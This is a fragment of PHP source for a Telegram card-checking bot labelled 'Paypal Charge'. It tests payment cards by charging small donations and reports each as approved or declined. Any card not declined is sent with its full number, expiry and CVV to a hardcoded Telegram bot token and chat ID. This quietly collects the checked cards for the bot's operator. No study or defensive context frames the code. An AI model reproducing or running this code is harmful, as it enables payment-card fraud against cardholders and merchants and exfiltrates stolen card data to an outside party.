        if (strpos($curl1, 'thank you for your donation')) {
            $cc_code = 'Approved ✅';
            $message = "Charged 1$ ✅";
            $full = "corvus\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $message";
            $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
         
        file_get_contents($url);
        } elseif (strpos($curl1, "Your card's security code is incorrect.")) {
            $cc_code = 'Approved ✅';
            $full = "corvus\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $message";
            $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
         
        file_get_contents($url);
        } elseif(strpos($curl1,"Your card has insufficient funds")){
            $cc_code = "Approved ✅";
            $full = "corvus\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $message";
            $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
             
            file_get_contents($url);
        }else{
            $cc_code = 'Declined ❌';
        }
        if (empty($result)) {
            $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝑷𝒂𝒚𝒑𝒂𝒍 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑮𝑨𝑻𝑬 : <code>𝑷𝒂𝒚𝒑𝒂𝒍 𝑪𝒉𝒂𝒓𝒈𝒆</code>\n[ϟ] 𝑪𝒂𝒓𝒅 : <code>$cc|$mes|$ano|$cvv</code>\n[ϟ] 𝑹𝒆𝒔𝒖𝒍𝒕 : <code>Unknown error</code>\n_𝑩𝒚: @$username [$plan]\n══════════════════════</b>", 'message_id' => $m8i, 'parse_mode' => 'html'];
            $m3  = EditMessageText($content);
            exit();
        }
        // $bank = $data['data']['bank'];
        // $country = $data['data']['country'];
        // $brand = $data['data']['vendor'];
        // $level = $data['data']['level'];
        // $type = $data['data']['type'];
        // $flag = $data['data']['countryInfo']['emoji'];
        $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝑷𝒂𝒚𝒑𝒂𝒍 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑮𝑨𝑻𝑬 : <code>𝑷𝒂𝒚𝒑𝒂𝒍 𝑪𝒉𝒂𝒓𝒈𝒆</code>\n[ϟ] 𝑪𝒂𝒓𝒅 : <code>$cc|$mes|$ano|$cvv</code>\n[ϟ] 𝑹𝒆𝒔𝒖𝒍𝒕 : <code>$cc_code</code>\n[ϟ] 𝑪𝒐𝒅𝒆 : <b>$msg</b>\n[ϟ] 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 : <b>$error</b>\n┏━━━━━━━━━━━━━━\n┣ 🍁 𝑩𝑰𝑵 𝑫𝑨𝑻𝑨 🍁\n┗━━━━━━━━━━━━━━\n[ϟ] 𝑩𝒊𝒏 𝑫𝒆𝒕𝒂𝒊𝒍𝒔: $bin - $type - $brand - $level\n[ϟ] 𝑩𝒂𝒏𝒌: $bank\n[ϟ] 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: $country - $flag\n[ϟ] 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚: @$username [$plan]\n[ϟ] 𝑩𝒐𝒕 𝑩𝒚 : <code>@AniDec4ypt3d</code>\n══════════════════════</b>", 'message_id' => $xdid, 'parse_mode' => 'html'];
        $m3  = EditMessageText($content);
    }
}
